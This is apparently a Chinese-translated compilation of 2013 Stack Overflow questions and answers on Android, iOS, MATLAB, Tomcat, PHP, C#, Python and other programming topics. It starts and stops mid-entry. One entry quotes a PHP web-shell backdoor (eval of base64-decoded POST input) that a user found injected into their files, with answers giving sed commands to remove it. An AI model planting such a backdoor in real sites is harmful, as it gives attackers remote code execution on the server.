        drawView.changeWidth(10);
        return true;
    }
    case R.id.w_large : {
        drawView.changeWidth(15);
        return true;
    }
    case R.id.text : {
        drawView.setInputDialog();
        return true;
    }
    default : {
        return true;
    }
     case R.id.tools:
        ll.setVisibility(LinearLayout.VISIBLE);
        return true;
     case R.id.b_custom_id:
        setCustomBackground(drawView);
        return true; 
    }
}

void setCustomBackground(DrawView v) {
    Intent fileChooserIntent = new Intent();
    fileChooserIntent.addCategory(Intent.CATEGORY_OPENABLE);
    fileChooserIntent.setType("image/*");
    fileChooserIntent.setAction(Intent.ACTION_GET_CONTENT);
    startActivityForResult(Intent.createChooser(fileChooserIntent, "Select Picture"), 1);
}

@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    // if statement prevents force close error when picture isn't selected
    if (resultCode == RESULT_OK)
    {
        Uri resultUri = data.getData();
        //String resultString = data.getData().toString();

        String drawString = resultUri.getPath();
        String galleryString = getGalleryPath(resultUri);

        // if Gallery app was used
        if (galleryString != null)
        {
            Log.d(TAG, galleryString);
            drawString = galleryString;
        }
        // else another file manager was used
        else
        {
            Log.d(TAG, drawString);
            //File Manager: "content://org.openintents.cmfilemanager/mimetype//mnt/sdcard/DCIM/Camera/IMG_20110909_210412.jpg"
            //ASTRO:        "file:///mnt/sdcard/DCIM/Camera/IMG_20110924_133324.jpg"
            if (drawString.contains("//"))
            {
                drawString = drawString.substring(drawString.lastIndexOf("//"));
            }
        }

        // set the background to the selected picture
        if (drawString.length() > 0)
        {
            Drawable drawBackground = Drawable.createFromPath(drawString);
            drawView.setBackgroundDrawable(drawBackground);
        }

    }
}

// used when trying to get an image path from the URI returned by the Gallery app
public String getGalleryPath(Uri uri) {
    String[] projection = { MediaStore.Images.Media.DATA };
    Cursor cursor = managedQuery(uri, projection, null, null, null);

    if (cursor != null)
    {
        int column_index =     cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
        cursor.moveToFirst();
        return cursor.getString(column_index);
    }

    return null;
}

} 
```

main.xml 在这里你有我唯一的一个 xml 文件。希望对我有用！

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="vertical" >
    <nt.finger.paint.DrawView
        android:layout_width="fill_parent"
        android:layout_height="0dp"
        android:layout_weight="3" 
        android:id = "@+id/DrawView"/>

    <LinearLayout
        android:id="@+id/linearLayout2"
        android:layout_width="match_parent"
        android:layout_height="42dp"
        android:layout_weight="0.08"
        android:background="@drawable/gray_bar"
        android:orientation="horizontal" >

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewColor"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:layout_marginLeft="5dp"
            android:layout_marginRight="5dp"
            android:src="@drawable/culoare" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewBar0"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/bar" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewSquare"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:layout_marginLeft="5dp"
            android:layout_marginRight="5dp"
            android:src="@drawable/square" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewBar1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/bar" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewText"
            android:layout_width="wrap_content"
            android:layout_marginLeft="5dp"
            android:layout_marginRight="5dp"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/a" />

         <ImageView
             android:contentDescription="@string/description"
            android:id="@+id/imageViewBar2"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/bar" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewLine"
            android:layout_width="wrap_content"
            android:layout_marginLeft="5dp"
            android:layout_marginRight="5dp"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/line" />

         <ImageView
             android:contentDescription="@string/description"
            android:id="@+id/imageViewBar3"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/bar" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewArrow"
             android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginLeft="5dp"
            android:layout_marginRight="5dp"
            android:layout_gravity="center"
            android:src="@drawable/arrow" />

         <ImageView
             android:contentDescription="@string/description"
            android:id="@+id/imageViewBar4"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/bar" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewSquiggle"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:layout_marginLeft="5dp"
            android:layout_marginRight="5dp"
            android:src="@drawable/squiggle" />

         <ImageView
             android:contentDescription="@string/description"
            android:id="@+id/imageViewBar5"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/bar" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewEraser"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:layout_marginLeft="5dp"
            android:layout_marginRight="5dp"
            android:src="@drawable/erase" />

         <ImageView
             android:contentDescription="@string/description"
            android:id="@+id/imageViewBar6"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/bar" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewUndo"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:layout_marginLeft="5dp"
            android:layout_marginRight="5dp"
            android:src="@drawable/undo" />

         <ImageView
             android:contentDescription="@string/description"
            android:id="@+id/imageViewBar7"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/bar" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewRedo"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:layout_marginLeft="5dp"
            android:layout_marginRight="5dp"
            android:src="@drawable/redo" />

         <ImageView
             android:contentDescription="@string/description"
            android:id="@+id/imageViewBar8"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/bar" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewHand"
            android:layout_width="50dp"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/hand" />

         <ImageView
             android:contentDescription="@string/description"
            android:id="@+id/imageViewBar9"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/bar" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewCrop"
            android:layout_width="50dp"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/crop" />

         <ImageView
             android:contentDescription="@string/description"
            android:id="@+id/imageViewBar10"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/bar" />

        <ImageView
            android:contentDescription="@string/description"
            android:id="@+id/imageViewDottedSquare"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:src="@drawable/patrat_punctat" />

    </LinearLayout>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:11:55.387

尝试`this.`在您的`findViewById`方法之前删除。也许您目前不在您的活动环境中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:57:48.243

在实际使用图像之前，请确保您`R.id.imageViewLine`从正确的布局中引用资源。

有时我们会遇到我们认为在当前布局中可用的资源实例，但该资源实际上是与当前活动布局不同的布局的一部分。这将导致`NullPointerException`我们去设置它的第一个属性。

**编辑：** 在代码中，您似乎确实设置了另一个当前布局；现在已经引入了附加代码。这可能是这里的问题。这可以从 -> 的调用堆栈跟踪中找到 `onCreate();`- `initContextMenus();`>`setContentView(drawView);` 这可能会干扰 ImageView 的检索。

# xcode - 如何在 UIKeyboardTypeDecimalPad 中包含返回按钮？

> ID：15555811
> 
> 赞同：2
> 
> 时间：2013-03-21T18:53:39.990
> 
> 标签：xcode, io, uitextfield, uitextfielddelegate, uikeyboardtype

我实现了一个`UITextField`应该只让用户包含十进制数字的方法。我已将键盘类型更改为，`UIKeyboardTypeDecimalPad`但此键盘布局上没有返回按钮以退出文本字段。我不想在键盘上添加额外的控件，因为它看起来很乱。如何更改`dot`按钮以返回并更改其功能，或者是否有其他选择？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-10-19T18:14:21.680

默认情况下，返回键不带有十进制键盘类型。使用以下代码片段来实现：

```
UIToolbar *toolbar = [[UIToolbar alloc] initWithFrame:CGRectMake(0.0f, 0.0f, 320.0f, 35.0f)];
    toolbar.barStyle=UIBarStyleBlackOpaque;

    // Create a flexible space to align buttons to the right
    UIBarButtonItem *flexibleSpace = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemFlexibleSpace target:nil action:nil];

    // Create a cancel button to dismiss the keyboard
    UIBarButtonItem *barButtonItem = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemDone target:self action:@selector(resetView)];

    // Add buttons to the toolbar
    [toolbar setItems:[NSArray arrayWithObjects:flexibleSpace, barButtonItem, nil]];

    // Set the toolbar as accessory view of an UITextField object
    _yourTextField.inputAccessoryView = toolbar; 
```

希望这可以帮助。快乐编码！

# matlab - 向量化积分2的函数

> ID：15555813
> 
> 赞同：1
> 
> 时间：2013-03-21T18:53:43.873
> 
> 标签：matlab, numerical-integration

我想评估形式为 \int_{-\infty}^a \int_{-infty}^b sum_{i,j}^K a_i*a_j*x^i*y^j*exp(- x^2 - y^2 + x*y)dx dy

其中 a_i 和 a_j 是常数。由于积分是线性的，我可以互换求和和积分，但在这种情况下，我必须评估 K^2 积分，而且时间太长。在这种情况下，我会执行以下操作：

```
for i = 1:K
   for j = 1:K
       fun = @(x,y) x.^i.*y.^j.*exp(-2.*(x.^2 + y.^2 - 2.*x.*y))
       part(i,j) = alpha(i)*alpha(j)*integral2(fun,-inf,a,-inf,b)
   end
end 
```

时间太长，所以我只想评估一个积分，但我不知道如何向量化 sum_{i,j}^K a_i*a_j*x^i*y^j*exp(-x^2 - y^2 + x*y)，即如何提供给integral2。| 将非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T10:10:37.617

关于什么：

```
I = [1:K]';
J = [1:K]';
funhandle = @(x,y)(sum(sum(...
repmat(alpha(I),1,K)...
.*repmat(alpha(J)',K,1)...
.*repmat(x.^I,1,K)...
.*repmat((y.^J)',K,1)))...
*exp(-x^2-y^2+x*y)) 
```

我认为它正确地完成了你想要的总和......

# notepad++ - Notepad++ 区域高亮

> ID：15555816
> 
> 赞同：0
> 
> 时间：2013-03-21T18:53:48.303
> 
> 标签：notepad++, highlighting, region

有没有办法为我的代码中的行范围分配特定的颜色？我想要的基本功能：为不同范围的行号分配不同的颜色，以便我可以轻松向下滚动以找到所需的颜色区域。

更好的功能将包括基于功能定义的自动不同颜色。此外，类似于 WinMerge 的侧边栏显示对不同代码行的快速访问将非常棒。

我正在使用 notepad++ 用 Ja​​vascript 编写，如果这有所不同（可能不应该）。

我已经阅读[了带有折叠功能的 notepad++ 用户定义区域，](https://stackoverflow.com/questions/3761206/notepad-user-defined-regions-with-folding)它似乎有一些颜色选项，但是当我单击视图选项卡时，我没有看到用户定义的对话。

如果不支持此功能并且没有允许此功能的外部插件（我不知道您可以使用插件更改程序的程度），那么编写此插件会有多困难。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:57:37.287

要在 Notepad++ 中突出显示代码块，请执行以下步骤

1.  选择所需的文本。
2.  右键单击以显示上下文菜单
3.  选择`Style token`并选择可用的五个选项中的任何一个（样式从`Using 1st style` 到`using 5th style`）。每个都有不同的颜色。如果你想要黄色，请选择`using 3rd style`。

如果您想创建自己的样式，可以`Style Configurator`在`Settings`菜单下使用。

# visual-studio-2008 - Visual Studio 2008 每隔几分钟就会挂起一分钟以上

> ID：15555818
> 
> 赞同：0
> 
> 时间：2013-03-21T18:53:49.580
> 
> 标签：visual-studio-2008

Visual Studio 2008（Windows Vista 上的 VS2008 版本 9 SP1）每隔几分钟就会挂起/冻结超过一分钟（有时长达 5 分钟）。我可以在 vs2008 忙的时候访问计算机的其他部分。这种情况在 2013 年 1 月和大约一周前发生了几天，现在又发生了。

起初我认为这只是在调试时发生，所以我尝试了这些帖子中的大部分内容（如果不是全部的话）：

*   [VS2008 调试器挂起](https://stackoverflow.com/questions/198979/vs2008-debugger-hang)

*   [http://social.msdn.microsoft.com/Forums/en-US/vsdebug/thread/e9c5da47-a194-4051-a3d5-28b404263b3f](http://social.msdn.microsoft.com/Forums/en-US/vsdebug/thread/e9c5da47-a194-4051-a3d5-28b404263b3f)

我认为它与断点有关，因为它似乎在添加/删除断点时发生：

*   [Visual Studio 在断点处冻结](https://stackoverflow.com/questions/10817287/visual-studio-freezes-on-breakpoints)

它发生在所有断点被删除并且程序甚至没有运行的情况下，尽管频率较低。有时我可以通过对 vs2008 不做任何事情来发生这种挂起，除了重新聚焦它或在 .cs 文件中上下滚动。说到这一点，它似乎只发生在 5000+ 行的大文件上。我没有在 3000 行的文件上复制这个问题。

我尝试删除 .suo 文件、bin 和 obj 文件夹、更新所有内容、回滚更新、病毒扫描、间谍软件扫描、内存测试、禁用插件、停用 vs2008 主机进程、禁用 nic、拔下以太网、使用 127.0.0.1 crl 修改主机文件.microsoft.com 和 127.0.0.1 6to4.ipv6.microsoft.com。

至于关于 Process Monitor 和 CreateFile 的评论，前几天我有一些日志，其中提到了一些关于 CreateFile 的内容，结果不是 SUCCESS，但今天所有的 CreateFile 结果都是成功的。

我安装了 DevExpress 控件。由于它似乎只发生在较大的文件上，我认为这可能是一个代码解析问题，并在 DevExpress 选项中发现了一些要禁用的东西。挂起似乎不太经常发生，但它仍然会发生。

任何其他想法/解决方案将不胜感激，

谢谢

更多相关链接：

*   [Visual Studio 2008 不断冻结我](https://stackoverflow.com/questions/4994364/visual-studio-2008-constantly-freezes-on-me)

**更新：**

我在 ProcMon 中有很多这些：C:\Program Files\DevExpress 2011.2\IDETools\System\CodeRush\BIN\PLUGINS\CR_SmartPaste.dll 的 CreateFile、QueryNetworkOpenInformationFile 和 CloseFile

因此，我决定使用此链接中的说明完全禁用 CodeRush：http: [//www.devexpress.com/Support/Center/p/Q393455.aspx](http://www.devexpress.com/Support/Center/p/Q393455.aspx)

到目前为止，一切似乎都很好......在发布问题后，我一定很喜欢解决问题......我会留下它以供将来参考。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T19:56:34.093

我个人的解决方案是按照以下链接中的说明禁用 CodeRush：http: [//www.devexpress.com/Support/Center/p/Q393455.aspx](http://www.devexpress.com/Support/Center/p/Q393455.aspx)

我只记得当我过去遇到这个问题时，我禁用了一小部分 CodeRush 功能。现在判断这是否是一个好的解决方案可能还为时过早。

**编辑：** 禁用 CodeRush 后，我遇到了其他不同的挂起/冻结问题，这些问题通过删除 .SUO 文件（再次）并清除 obj 和 bin 文件夹来解决。

修复这些问题后，我突然无法在发布模式下构建...大声笑...但该问题似乎已经消失...我做的最后一件事是禁用所有诺顿保护并重新启动计算机。当我手动禁用每个项目时，我重新启动了 b/c norton crashed，因此我无法访问管理窗口。在这次磨难中，我又重新启动了几次计算机，所以我认为这不仅仅是问题所在。我拥有截至 2013 年 3 月 26 日的最新版本的诺顿，它最近更新了，所以我认为新版本可能会影响 vs2008。

我在 vista 但这个链接[http://blogs.msdn.com/b/webdev/archive/2010/12/16/how-to-solve-visual-studio-hang-problem-when-working-in-win7 -with-norton-antivirus.aspx](http://blogs.msdn.com/b/webdev/archive/2010/12/16/how-to-solve-visual-studio-hang-problem-when-working-in-win7-with-norton-antivirus.aspx)可能会帮助 win7 上遇到类似问题的人。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-05T10:35:05.990

整个 Studio UI 不断冻结，让我受了很多苦。我曾经将鼠标悬停在工具栏中的按钮上，这会导致 UI 刷新。然后我找到了一个永久的解决方案，同时尝试不同的设置。

尝试工具 - 选项 - 环境 - 常规“视觉体验”组取消选中“根据客户端性能自动调整视觉体验”（下一步需要）。然后取消选中“使用硬件图形加速”

为我工作。祝你好运

# bash - 在文件中查找和替换 PHP 代码

> ID：15555834
> 
> 赞同：0
> 
> 时间：2013-03-21T18:54:26.120
> 
> 标签：bash, shell, scripting

我有以下字符串被注入到每个

```
if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
```

如何删除它？

我正在尝试以下方法，但运气不佳：

```
find /home -type f -exec sed -i 's/if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}//g' {} \; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T19:32:53.497

`$(){}[]`您的字符串包含许多在正则表达式（例如）中具有特殊含义的字符。您需要逃脱所有这些才能`sed`工作。您还需要使用`'\''`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:51:08.573

使用`$''`正则表达式参数的语法并转义分隔符`'`、`$`和`[`其中：

```
find /home -type f -exec sed -i $'s/if(@\$_POST\[\'test\']){eval(base64_decode(\$_POST\[\'test\'])); exit();}php if(@\$_POST\[\'test\']){eval(base64_decode(\$_POST\[\'test\'])); exit();}//g' {} \; 
```

# iphone - 关闭并显示视图控制器会使之前的控制器出现

> ID：15555836
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:54:34.557
> 
> 标签：iphone, ios, objective-c, xcode, rootview

我试图让这个方法正常工作，但由于某种原因，这个功能会出现以前的控制器（启动控制器）而不是显示家庭控制器。当我退出启动控制器时，我的家庭控制器会显示并且工作正常。下面的代码应该没问题。有没有办法防止根控制器弹出。也许永远消失？如果需要，愿意发布根控制器代码。

```
 UIViewController *startupController;

    startupController = [[homeViewController alloc] initWithNibName:nil bundle:nil];

    [self.navigationController pushViewController:startupController animated:NO];
    [self dismissModalViewControllerAnimated:NO]; 
```

更新：我上面的代码位于一个标签栏方法中，我在其中创建了一个标签栏，其背后的原因是我试图让它在你按下某个标签栏按钮的地方显示这个控制器。控制器由导航控制器关联。这里还有一个提示，如果我使用这种方法 `[self presentViewController:homeNavigationController animated:NO completion:nil];`，它会正常显示，但不显示根控制器，但标签栏会消失。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:02:13.570

您正在使用导航控制器，因此请替换`[self dismissModalViewControllerAnimated:NO];`为以下内容。

`[self.navigationController popViewControllerAnimated:NO];`

# tomcat - 如何在命令行上传递tomcat端口号？

> ID：15555838
> 
> 赞同：14
> 
> 时间：2013-03-21T18:54:35.603
> 
> 标签：tomcat

是否可以告诉 tomcat 使用特定端口而不是 server.xml 中指定的端口？或者一种在 server.xml 中将环境变量配置为端口号的方法？（我可以在启动tomcat的批处理文件中设置）

本质上，我想启动一个 tomcat 实例的不同副本（版本），而不必手动更改每个副本中的 server.xml，也不必记住哪个副本会在哪个端口启动。我希望在启动它时指定端口号，以便在多个实例中没有冲突。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2013-03-21T20:00:51.297

更改 server.xml 以便它使用从属性扩展的端口号，而不是硬编码的端口号：

```
<Server port="${port.shutdown}" shutdown="SHUTDOWN">
...
  <Connector port="${port.http}" protocol="HTTP/1.1"/>
...
</Server> 
```

以下是在 Linux 中启动的方法（假设您的当前目录是 CATALINA_HOME）：

```
JAVA_OPTS="-Dport.shutdown=8005 -Dport.http=8080" bin/startup.sh 
```

在 Windows 中，它应该如下所示：

```
set "JAVA_OPTS=-Dport.shutdown=8005 -Dport.http=8080"
bin\startup.bat 
```

# php - 如何内爆这个数组

> ID：15555841
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:54:49.310
> 
> 标签：php, arrays, implode

我有这样的表项：

```
id       color           stock
1     red,green,yellow   10,20,30 
```

我拿了一个红色 5 和绿色 2 的物品，然后像这样放在桌子 x 上：

```
id   id_product    color    qty
1       1           red      5   
1       1           green    2 
```

我想要实现的是更新表项变成这样：

```
id       color           stock
1     red,green,yellow   5,18,30 
```

我要做的是：

```
$colors = $resultset['color'];
$color = explode(",",$result['color']);
$stock = explode(",",$result['stock']);
$flag = array_search($colors,$color);
$stock[$flag] = $stock[$flag] - $resultset['qty']; 
```

从我上面写的代码中，当我回显 $stock[$flag] 时，它将返回 5 和 18，但我怎样才能将其内爆为 5、18、30？

我的问题是，我在表 x 中有 2 个项目具有相同的 id_product 但颜色不同，所以当我进行一些循环并且我确实将它内爆时，它会给出如下结果：5,20,30 10,18,30。所以，当我更新到表格项目时，它只是像这样改变：

```
id       color           stock
1     red,green,yellow   10,18,30 
```

我只需要一些建议或帮助来弄清楚我怎样才能使该股票内爆成为：5,18,30。我将感谢您的回答和建议..thx

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T19:03:46.687

似乎您要求的是，鉴于您可以使用 explode 并想要 implode 以便您知道该功能，因此情况可能并非如此，但以防万一：

内爆（“，”，$股票）；

# c# - Visual Studio 项目文件指定多个导入

> ID：15555849
> 
> 赞同：1
> 
> 时间：2013-03-21T18:55:16.027
> 
> 标签：c#, visual-studio-2008, wix, windows-installer

我有一个 C# 项目。我想根据配置构建 exe 或 MSI。

MSI 定义为

```
<PropertyGroup>
  <Configuration Condition=" '$(Configuration)' == '' ">MSI</Configuration>
  <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
  <ProductVersion>9.0.30729</ProductVersion>
  <ProjectGuid>{DCB76E90-6364-4DFB-B568-3680EE4F9C80}</ProjectGuid>
  <SchemaVersion>2.0</SchemaVersion>
  <OutputName>Project1</OutputName>
  <OutputType>Package</OutputType>
  <WixTargetsPath Condition=" '$(WixTargetsPath)' == '' AND '$(MSBuildExtensionsPath32)' != '' ">$(MSBuildExtensionsPath32)\Microsoft\WiX\v3.x\Wix.targets</WixTargetsPath>
  <WixTargetsPath Condition=" '$(WixTargetsPath)' == '' ">$(MSBuildExtensionsPath)\Microsoft\WiX\v3.x\Wix.targets</WixTargetsPath>
</PropertyGroup>
<PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'MSI|x86' ">
  <OutputPath>bin\MSI2\</OutputPath>
  <IntermediateOutputPath>obj\$(Configuration)\</IntermediateOutputPath>
</PropertyGroup>
<ItemGroup>
  <Compile Include="MyWxs.wxs" />
</ItemGroup> 
```

问题是当我尝试同时拥有两者时

```
<Import Project="$(WixTargetsPath)" /> 
```

和

```
<Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" /> 
```

错误

```
A problem occurred while trying to set the "TargetType" parameter for the IDE's in-process compiler.
Invalid target type "package" for /target: must specify 'exe', 'winexe', 'library', or 'module'. 
```

我该怎么办？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-21T19:17:53.107

您不能将这两个目标都导入到一个项目中。他们都希望能够处理这些`Compile`项目（使用完全不同的工具，即：`candle.exe`和`csc.exe`）。您需要单独的项目。通常，`Microsoft.CSharp.targets`进入 .csproj 并`Wix.targets`进入 .wixproj。

# java - 如何处理 java.net.URL.openConnection() 抛出的 IOException？

> ID：15555852
> 
> 赞同：2
> 
> 时间：2013-03-21T18:55:20.450
> 
> 标签：java, android, exception-handling, httpurlconnection

我目前正在编写一个简单的方法来快速构建一个 HttpURLConnection 并且我在理解发生的异常时遇到了一些问题。它目前看起来像这样：

```
public static HttpURLConnection buildConnection(String urlString) throws IOException{
    try{
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setReadTimeout(10000 /* 10 seconds */);
        connection.setConnectTimeout(10000 /* 10 seconds */);
        return connection;

    } catch (MalformedURLException e){
        // Impossible - All network URLs are taken from String resources
        Log.w(LOG_LABEL, "URL \"" + urlString + "\" was malformed");
        e.printStackTrace();
        return null;
    } catch (ProtocolException e){
        // Impossible - "GET" is a valid Request method
        e.printStackTrace();
        return null;
    }
} 
```

我捕获并记录 MalformedURLException 和 ProtocolException 异常，因为我知道它们不可能发生。但是我抛出了 url.openConnection() 可能抛出的 IOException。这是什么异常？是什么原因造成的，我的应用程序在发生这种情况时应该如何表现？

非常感谢大家，威廉

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-21T19:19:01.497

MalformedURLException：当 URL 的格式不正确时（例如 URL = "?@fake"） ProtocolException：表示底层协议有错误（可能是 SSL 证书无效）

IOException 您没有得到 MalformedURLException 仅表明您提供的字符串 URL 的结构是正确的。它不保证相应的主机存在并且可以访问。它也不保证在连接到主机或对该主机执行任何读取或写入时不会出现问题。因此，如果出现问题（主机无法访问）或在连接握手期间出现读/写错误，则打开与所需主机的连接时，您可能会收到 IOException。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T19:00:50.453

网络连接问题 - 无法写入底层套接字或从底层套接字接收。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T19:05:32.047

您应该将 Javadoc 视为第一站。[http://docs.oracle.com/javase/6/docs/api/java/io/IOException.html](http://docs.oracle.com/javase/6/docs/api/java/io/IOException.html)

您应该能够通过检查他抛出异常的**原因**和**消息参数来获得原因（如果有）**

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-03-21T19:02:59.680

表示发生了某种 I/O 异常。此类是由失败或中断的 I/O 操作产生的一般异常类。希望这可以帮助

# python - Python 调用命令行上指示的脚本是否有路径？

> ID：15555858
> 
> 赞同：1
> 
> 时间：2013-03-21T18:55:35.247
> 
> 标签：python, windows, path

我想从 DOS shell 命令行（或从 .bat 文件）调用 Python 脚本，语法如下：

```
C:\python27\python myscript.py 
```

该脚本`myscript.py`位于目录`c:\a_process\python_lib`. 我希望能够让 Python 通过搜索路径找到该脚本，因此当我的当前目录是任意的（如`C:\junk`）时我可以调用它。我的问题是我无法找出 Python 用于在调用 Python 的命令行上指示的脚本的路径（如果有的话）。我已经搜索了 Python 文档、SO 和网络，但确实没有发现任何有用的信息。（我在 Python 本身中发现了很多关于命令行解析的东西，这不是我想要的）。

我`adt_python_lib.pth`在目录中有一个文件`C:\Python27\Lib\site-packages`并验证它是否有效（我可以导入位于那里的模块。）作为一个实验，我还尝试设置`PYTHONPATH`环境变量（通过输入`SET`DOS shell 并查看该行来验证

```
PYTHONPATH=C:\a_process\python_lib 
```

在输出中。对于它的价值，我还调用了 Python 并做了一个`sys.path`，我可以看到它确实`C:\a_process\python_lib`如预期的那样列在路径中：`['', 'c:\\a_process\\python_lib', ...]`

我发现的最接近的 SO 问题是[Executing python program](https://stackoverflow.com/questions/10461054/executing-python-program/10461185#10461185)。

这似乎暗示（但没有说明）没有搜索 Python 调用命令行上指示的文件的路径。如果有人可以权威地声明这是正确的，那么我将恢复为另一种选择（可能只是直接添加`c:\a_process\python_lib`并`%PATH%`调用脚本）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:34:27.660

无需指定完整的文件名，只需使用`-m`开关指定模块即可。

```
C:\python27\python -m myscript 
```

这假定该目录是您的`PYTHONPATH`环境变量的一部分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:17:47.447

我不相信你可以做你想做的事，但是......

尝试将 Python 命令包装在 a 中`.bat`，并将 BAT 文件放在`PATH`. 然后你可以`.bat`从任何地方调用（只要确保只使用绝对路径来指定要在你的 BAT 文件中运行的 python 脚本的位置）。

# c# - C# 通过一个事件从多个对象路由事件

> ID：15555860
> 
> 赞同：0
> 
> 时间：2013-03-21T18:55:36.243
> 
> 标签：c#, events

所以我正在使用 C# 3.0，并且我正在尝试完成某种特定形式的事件路由。

```
public class A
{ 
  public delegate void FooDel(string blah);
  public Event FooDel FooHandler;

  //...some code that eventually raises FooHandler event
}

public class B
{
  public A a = new A(); 

  //...some code that calls functions on "a" that might cause
  //FooHandler event to be raised
}

public class C
{
  private List<B> MyListofBs = new List<B>();

  //...code that causes instances of B to be added to the list
  //and calls functions on those B instances that might get A.FooHandler raised

  public Event A.FooDel FooHandler;
} 
```

我想弄清楚的是如何将`A.FooHandler`A 实例的所有事件触发路由到一个 event `C.FooHandler`。因此，如果有人注册，`C.FooHandler`他们真的会收到由列表中 B 的实例包含的任何 A 实例引发的事件。

我将如何做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:09:22.977

使用您提供的示例代码，您无法做您想做的事。由于您已在`A`内设为私有`B`，因此您将阻止`A`从类之外的任何代码`B`（包括`C`类）对实例的访问。

您必须以某种方式使您的`A`实例可公开访问，以便其中的方法`C`可以访问它`B`，以便订阅和取消订阅`A`.

* * *

**编辑：**假设 Ba 是公开的，因为是私有的，所以最简单的事情`C.MyListofBs`是创建自己的 Add/Remove 方法，这些方法也订阅和取消订阅 A 中想要的事件，就像这样。

我还冒昧地取消了您的代表，以支持更清洁的[`Action`](http://msdn.microsoft.com/en-us/library/018hxwa8.aspx)班级。

```
public class A
{ 
    public Event Action<string> FooHandler;

    //...some code that eventually raises FooHandler event
}

public class B
{
    public A a = new A();

    //...some code that calls functions on "a" that might cause
    //FooHandler event to be raised
}

public class C
{
    private List<B> MyListofBs = new List<B>();
